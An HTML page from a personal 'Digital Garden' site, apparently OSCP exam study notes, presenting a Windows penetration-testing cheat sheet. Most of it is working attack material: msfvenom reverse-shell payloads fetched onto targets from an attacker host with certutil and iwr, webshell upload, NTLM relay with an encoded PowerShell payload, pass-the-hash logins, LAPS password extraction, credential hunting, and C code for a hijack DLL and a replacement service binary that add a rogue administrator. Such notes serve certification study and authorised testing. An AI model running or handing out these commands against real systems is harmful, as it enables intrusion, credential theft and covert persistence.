@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Cheat Sheet - OSCP Windows :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Related: Tags: OSCP
+Quick Reference dir /s/b local.txt - Usually C:\ or C:\users\username\desktop\ dir /s/b proof.txt - Usually C:\Users\Administrator\Desktop\ dir /s/b *.txt RDP: xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore RevShell.exe: msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe Compile C: /usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe Compile C#: msbuild projectname.csproj Transfer to Windows host: certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe Fix Broken Path: set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0; Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester Port Enumeration (from Kali) HTTP/WebDav (80): cadaver 192.168. Run put /usr/share/webshells/aspx/cmdasp.aspx to upload command shell, then access via browser Kerberos (88): kerbrute userenum -d domain.name --dc 192.168. users SMB (139/445): sudo nmap --script smb-vuln* -p 139,445 192.168. smbclient -U user \\\\192.168. impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot; (base64 powershell one-liner) Kali: Call fake directory dir \\192.168.xx.xxx\fake for reverse shell Pass the Hash: smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b LDAP (389): sudo nmap -n -sV -Pn -script &#39;ldap* and not brute&#39; 192.168. Domain Name found (LDAP Search): ldapsearch -v -x -b &#39;DC=domain,DC=name&#39; -H &#39;ldap://192.168.&#39; &#39;(objectclass=*)&#39; Use credentials to find admin password ldapsearch -x -H &#39;ldap://192.168.x.x&#39; -D &#39;domain\user&#39; -w &#39;userpassword&#39; -b &#39;dc=domain,dc=name&#39; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd To Login psexec.py domain.name/administrator: &#39;adminpassword&#39;@192.168.x.x to login Impacket Psexec.py - /usr/share/doc/python3-impacket/examples/psexec.py impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/oscp---cheat-sheet---windows/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Cheat Sheet - OSCP Windows">
+<meta property="og:description" content="Related: Tags: OSCP
+Quick Reference dir /s/b local.txt - Usually C:\ or C:\users\username\desktop\ dir /s/b proof.txt - Usually C:\Users\Administrator\Desktop\ dir /s/b *.txt RDP: xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore RevShell.exe: msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe Compile C: /usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe Compile C#: msbuild projectname.csproj Transfer to Windows host: certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe Fix Broken Path: set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0; Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester Port Enumeration (from Kali) HTTP/WebDav (80): cadaver 192.168. Run put /usr/share/webshells/aspx/cmdasp.aspx to upload command shell, then access via browser Kerberos (88): kerbrute userenum -d domain.name --dc 192.168. users SMB (139/445): sudo nmap --script smb-vuln* -p 139,445 192.168. smbclient -U user \\\\192.168. impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot; (base64 powershell one-liner) Kali: Call fake directory dir \\192.168.xx.xxx\fake for reverse shell Pass the Hash: smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b LDAP (389): sudo nmap -n -sV -Pn -script &#39;ldap* and not brute&#39; 192.168. Domain Name found (LDAP Search): ldapsearch -v -x -b &#39;DC=domain,DC=name&#39; -H &#39;ldap://192.168.&#39; &#39;(objectclass=*)&#39; Use credentials to find admin password ldapsearch -x -H &#39;ldap://192.168.x.x&#39; -D &#39;domain\user&#39; -w &#39;userpassword&#39; -b &#39;dc=domain,dc=name&#39; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd To Login psexec.py domain.name/administrator: &#39;adminpassword&#39;@192.168.x.x to login Impacket Psexec.py - /usr/share/doc/python3-impacket/examples/psexec.py impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx
+" />
+<meta property="og:url" content="/posts/oscp---cheat-sheet---windows/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/oscp---cheat-sheet---windows/">Cheat Sheet - OSCP Windows</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+      
+      #<a href="/tags/oscp/">oscp</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Related:
+Tags: <a href="/posts/cheat-sheet---oscp-linux/">OSCP</a></p>
+<hr>
+<h2 id="quick-reference">Quick Reference<a href="#quick-reference" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li><code>dir /s/b local.txt</code> - Usually <code>C:\</code> or <code>C:\users\username\desktop\</code></li>
+<li><code>dir /s/b proof.txt</code> - Usually <code>C:\Users\Administrator\Desktop\</code></li>
+<li><code>dir /s/b *.txt</code></li>
+<li>RDP: <code>xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore</code></li>
+<li>RevShell.exe: <code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe</code></li>
+<li>Compile C: <code>/usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe</code></li>
+<li>Compile C#: <code>msbuild projectname.csproj</code></li>
+<li>Transfer to Windows host: <code>certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe</code></li>
+<li>Fix Broken Path: <code>set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;</code></li>
+<li>Windows Exploit Suggester: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
+</ul>
+<h2 id="port-enumeration-from-kali">Port Enumeration (from Kali)<a href="#port-enumeration-from-kali" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li><strong>HTTP/WebDav (80)</strong>: <code>cadaver 192.168.</code>
+<ul>
+<li>Run <code>put /usr/share/webshells/aspx/cmdasp.aspx</code> to upload command shell, then access via browser</li>
+</ul>
+</li>
+<li><strong>Kerberos (88)</strong>: <code>kerbrute userenum -d domain.name --dc 192.168. users</code></li>
+<li><strong>SMB (139/445)</strong>: <code>sudo nmap --script smb-vuln* -p 139,445 192.168.</code>
+<ul>
+<li><code>smbclient -U user \\\\192.168.</code></li>
+<li><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</code> (base64 powershell one-liner)
+<ul>
+<li>Kali: Call fake directory <code>dir \\192.168.xx.xxx\fake</code> for reverse shell</li>
+</ul>
+</li>
+<li>Pass the Hash: <code>smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b</code></li>
+</ul>
+</li>
+<li><strong>LDAP (389)</strong>: <code>sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.</code>
+<ul>
+<li>Domain Name found (LDAP Search): <code>ldapsearch -v -x -b 'DC=domain,DC=name' -H 'ldap://192.168.' '(objectclass=*)'</code></li>
+<li>Use credentials to find admin password <code>ldapsearch -x -H 'ldap://192.168.x.x' -D 'domain\user' -w 'userpassword' -b 'dc=domain,dc=name' &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</code>
+<ul>
+<li>To Login <code>psexec.py domain.name/administrator: 'adminpassword'@192.168.x.x</code> to login</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="impacket">Impacket<a href="#impacket" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Psexec.py - <code>/usr/share/doc/python3-impacket/examples/psexec.py</code>
+<code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx</code></p>
+<h2 id="privesc-from-windows">PrivEsc (From Windows)<a href="#privesc-from-windows" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation">HackTricks - Windows PrivEsc Checklist</a></p>
+<ul>
+<li>Group memberships of the current user: <code>whoami /groups</code>
+<ul>
+<li>Existing groups: <code>net localgroup</code> or <code>Get-LocalGroup</code></li>
+<li>Inspect groups <code>Get-LocalGroupMember groupname</code></li>
+</ul>
+</li>
+<li>Existing users: <code>net user</code> or <code>Get-LocalUser</code>
+<ul>
+<li>Look for <em>Remote Desktop Users</em> (access with RDP) and <em>Remote Management Users</em> (Access with WinRM)</li>
+<li>Look for <em>Log on as a batch job</em> and schedule a task to execute a program</li>
+<li>Try <code>backupadmin</code>: <code>runas /user:backupadmin cmd</code> (Prompt for password)</li>
+</ul>
+</li>
+<li>Operating system, version and architecture: <code>systeminfo</code>
+<ul>
+<li>Wiki Windows build number</li>
+<li>Look for <a href="https://github.com/SecWiki/windows-kernel-exploits?tab=readme-ov-file">Windows Kernel Exploits</a></li>
+</ul>
+</li>
+<li>Network information: <code>ipconfig /all</code>
+<ul>
+<li>Check <code>route print</code></li>
+<li>Show active connections <code>netstat -ano</code></li>
+</ul>
+</li>
+<li>Installed applications:
+<ul>
+<li>32-bit applications <code>Get-ItemProperty &quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname</code> (Note - Remove <code>select displayname</code> for full properties)</li>
+<li>64-bit applications <code>Get-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname</code> (Note - Remove <code>select displayname</code> for full properties)</li>
+<li>Running processes: <code>get-process</code></li>
+</ul>
+</li>
+</ul>
+<p>Well Known SIDs for PrivEsc (User RID users starts at 1000, eg 1001 is 2nd user)</p>
+<pre tabindex="0"><code>S-1-0-0                       Nobody        
+S-1-1-0	                      Everybody
+S-1-5-11                      Authenticated Users
+S-1-5-18                      Local System
+S-1-5-domainidentifier-500    Administrator
+</code></pre><h3 id="find-credentials">Find Credentials<a href="#find-credentials" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Try each of these steps <em><strong>for each user you get access to</strong></em></p>
+<ul>
+<li>Cleartext files: <code>Get-ChildItem -Path C:\Users\username -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue</code></li>
+<li>Powershell history: <code>get-history</code> or <code>(Get-PSReadlineOption).HistorySavePath</code>
+<ul>
+<li>&ldquo;Enter-PSSession&rdquo;, copy/paste the commands into terminal again.</li>
+</ul>
+</li>
+<li>Keepass: <code>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue</code>
+<ul>
+<li><code>keepass2john Database.kdbx &gt; keepass.hash</code></li>
+<li>Remove <code>Database</code> from start of <code>keepass.hash</code> then <code>john keepass.hash</code></li>
+</ul>
+</li>
+<li>XAMPP: <code>Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue</code></li>
+</ul>
+<h3 id="evil-winrm---creates-powershell-remoting-session">Evil-WinRM - Creates Powershell Remoting Session<a href="#evil-winrm---creates-powershell-remoting-session" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>Login: <code>evil-winrm -i 192.168.xx.xxx -u user -p &quot;password\$\!&quot;</code> (escape special characters: <code>&quot;password$!&quot;</code> = <code>&quot;password\$\!&quot;</code>)</li>
+</ul>
+<h2 id="using-scheduled-tasks">Using Scheduled Tasks<a href="#using-scheduled-tasks" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Find scheduled tasks: <code>schtasks /query /fo LIST /v</code>
+<ul>
+<li>Inspect <code>Author</code>, <code>Taskname</code>, <code>Task To Run</code>, and <code>Next Run Time</code></li>
+<li>Find regularly scheduled task (every minute) in a folder you can change</li>
+<li>Move original to safe space: <code>move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak</code></li>
+<li>Pull <code>adduser.exe</code> in with iwr: <code>iwr -uri http://192.168.xx.xxx/adduser.exe -outfile C:\target\path\scheduledtask.exe</code></li>
+</ul>
+</li>
+<li><code>C:\Users\moss\Searches\VoiceActivation.exe</code></li>
+</ul>
+<h3 id="services">Services<a href="#services" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>Find running processes: <code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}</code></li>
+<li>Start Process monitor and filter for target process
+<ul>
+<li>Use <code>restart-servce servicename</code> if nothing is listed</li>
+<li>Search for DLLs with;
+<ul>
+<li>Operation <code>CreateFile</code></li>
+<li>Details <code>NAME NOT FOUND</code></li>
+<li>With path to a folder you control (see <code>$env:path</code> for paths)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Create a DLL with that name (eg. <code>mousepad myDLL.cpp</code>)</li>
+</ul>
+<pre tabindex="0"><code>#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system (&#34;net user john password123! /add&#34;);
+  	    i = system (&#34;net localgroup administrators john /add&#34;);
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+</code></pre><ul>
+<li>Cross-compile with mingw32: <code>x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll</code></li>
+<li>Run http server and pull DLL onto target system: <code>iwr -uri http://192.168.xxx.xx/myDLL.dll -Outfile myDLL.dll</code></li>
+<li>Move DLL to folder you control, then restart service with <code>restart-service servicename</code></li>
+<li>Check for new user: <code>net user</code></li>
+</ul>
+<h2 id="service-binary-hijacking">Service Binary Hijacking<a href="#service-binary-hijacking" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Find running processes <code>Powershell: Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}</code>
+<ul>
+<li>Keep an eye out for services NOT installed in <code>System32</code></li>
+</ul>
+</li>
+<li>Check permissions for target binary; `Powershell: icacls &ldquo;C:\xampp\apache\bin\httpd.exe&rdquo;
+<ul>
+<li>Look for <code>BUILTIN\Users:(F)</code> (Full Access for standard users)</li>
+</ul>
+</li>
+</ul>
+<h3 id="permissions-for-icacls">Permissions for Icacls<a href="#permissions-for-icacls" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>Replace original binary with a new one written in C (<code>adduser.c</code>) that will create a new administrator (<code>dave2:password123!</code>)</li>
+</ul>
+<pre tabindex="0"><code>#include &lt;stdlib.h&gt;
+
+int main ()
+{
+  int i;
+  
+  i = system (&#34;net user dave2 password123! /add&#34;);
+  i = system (&#34;net localgroup administrators dave2 /add&#34;);
+  
+  return 0;
+}
+</code></pre><ul>
+<li>Compile the C code with MingW32: <code>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe</code></li>
+<li>Pull new binary (from Kali server) onto target from Powershell: <code>iwr -uri http://192.168.xxx.xx/adduser.exe -Outfile adduser.exe</code></li>
+<li>Move original service binary to home: <code>move C:\xampp\apache\bin\httpd.exe httpd.exe</code></li>
+<li>Move &amp; Rename new binary into it&rsquo;s place: <code>move .\adduser.exe C:\xampp\apache\bin\httpd.exe</code></li>
+<li>Restart the running service: <code>net stop httpd</code> then <code>net start httpd</code></li>
+<li><code>C:\BackupMonitor\BackupMonitor.exe</code></li>
+</ul>
+<h3 id="service-control-privilege">Service Control Privilege<a href="#service-control-privilege" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>If user does not have service control privilege:</p>
+<ul>
+<li>See if service has <code>Auto</code> StartMode: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &lsquo;httpd&rsquo;}</li>
+<li>If user has <code>SeShutdownPrivilege</code> (check <code>whoami /priv</code>) then reboot: <code>shutdown /r /t 0</code></li>
+</ul>
+<h2 id="service-dll-hijacking">Service DLL Hijacking<a href="#service-dll-hijacking" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<pre tabindex="0"><code>1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+</code></pre><p>Standard DLL search order on current Windows versions
+Find running processes: <code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}</code>
+Start Process monitor and filter for target process (Use ProcMon64.exe?)</p>
+<ul>
+<li>Use <code>restart-servce servicename</code> if nothing is listed</li>
+<li>Search for DLLs with;
+<ul>
+<li>Operation <code>CreateFile</code></li>
+<li>Details <code>NAME NOT FOUND</code></li>
+<li>With path to a folder you control (see <code>$env:path</code> for paths)</li>
+</ul>
+</li>
+<li>Create a DLL with that name (eg. <code>mousepad myDLL.cpp</code>)</li>
+</ul>
+<pre tabindex="0"><code>#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system (&#34;net user john password123! /add&#34;);
+  	    i = system (&#34;net localgroup administrators john /add&#34;);
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+</code></pre><ul>
+<li>Cross-compile with mingw32: <code>x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll</code></li>
+<li>Run http server and pull DLL onto target system: <code>iwr -uri http://192.168.xxx.xx/myDLL.dll -Outfile myDLL.dll</code></li>
+<li>Move DLL to folder you control, then restart service with <code>restart-service servicename</code></li>
+<li>Check for new user: <code>net user</code></li>
+</ul>
+<h2 id="unquoted-service-paths">Unquoted Service Paths<a href="#unquoted-service-paths" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Look for services that have spaces in the file path, and create an .exe with part of the path</p>
+<pre tabindex="0"><code class="language-Example" data-lang="Example">C:\Program.exe
+C:\Program Files\Enterprise.exe
+C:\Program Files\Enterprise Apps\Current.exe
+C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+</code></pre><ul>
+<li>Using CMD: <code>wmic service get name,pathname |  findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code></li>
+<li>Test starting/stopping service: <code>start-service servicename</code> &amp; <code>stop-service servicename</code></li>
+<li>Test parts of the path to find write-permissions <code>(RX,W)</code> for the current user:
+<ul>
+<li>eg. <code>icacls &quot;C:\&quot;</code> then <code>icacls &quot;C:\Program Files</code> then <code>C:\Program Files\Enterprise Apps</code></li>
+<li>If the <code>Enterprise Apps</code> folder is writeable, then rename <code>adduser.exe</code> to the partial path; eg. <code>Current.exe</code> for <code>C:\Program Files\Enterprise Apps\Current.exe</code></li>
+<li>Start or restart the service to execute the malicious binary in the path</li>
+</ul>
+</li>
+</ul>
+<h3 id="privileges">Privileges<a href="#privileges" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>Check if user has admin access: <code>Find-LocalAdminAccess</code> (can take several mins)</li>
+<li>Check system for logged in users: <code>Get-NetSession -ComputerName files04 -Verbose</code>
+<ul>
+<li>Windows has updated since <code>v10.0 (16299)</code> (aka build 1709) to block <code>Net-Session</code>
+Alternatively:</li>
+<li>Upload/Use Psloggedon.exe: <code>.\PsLoggedon.exe \\host04</code></li>
+</ul>
+</li>
+<li>Add a user to a group: `net group &ldquo;Management Department&rdquo; stephanie /add /domain
+<ul>
+<li>And remove: <code>net group &quot;Management Department&quot; stephanie /del /domain</code></li>
+</ul>
+</li>
+<li>Change the password of a user you control: <code>Set-ADAccountPassword -Identity &quot;robert&quot; -Reset -NewPassword (ConvertTo-SecureString -AsPlainText &quot;p@ssw0rd&quot; -Force)</code></li>
+</ul>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/cheat-sheet---networking/" class="button inline prev">
+        &lt; [<span class="button__text">Cheat Sheet - Networking</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/cheat-sheet---linux/" class="button inline next">
+         [<span class="button__text">Cheatsheet - Linux</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
